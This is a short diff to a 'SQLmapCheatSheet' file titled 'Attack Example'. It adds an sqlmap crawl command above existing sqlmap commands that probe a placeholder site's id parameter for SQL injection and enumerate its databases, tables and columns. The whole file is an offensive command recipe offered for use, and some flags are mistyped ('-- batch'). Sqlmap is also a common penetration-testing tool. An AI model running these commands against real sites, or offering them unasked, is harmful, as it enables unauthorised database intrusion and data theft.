@@ -1,6 +1,6 @@
 # SQLmapCheatSheet
 # Attack Example:-
-
+    $ sqlmap -u www.site.com/ --crawl 2 --batch
     $ sqlmap -u www.site.com/index.php?id=1 -- batch --dbs
     $ sqlmap -u www.site.com/index.php?id=1 -- batch -D database_name --tables
     $ sqlmap -u www.site.com/index.php?id=1 -- batch -D database_name -T table_name --columns
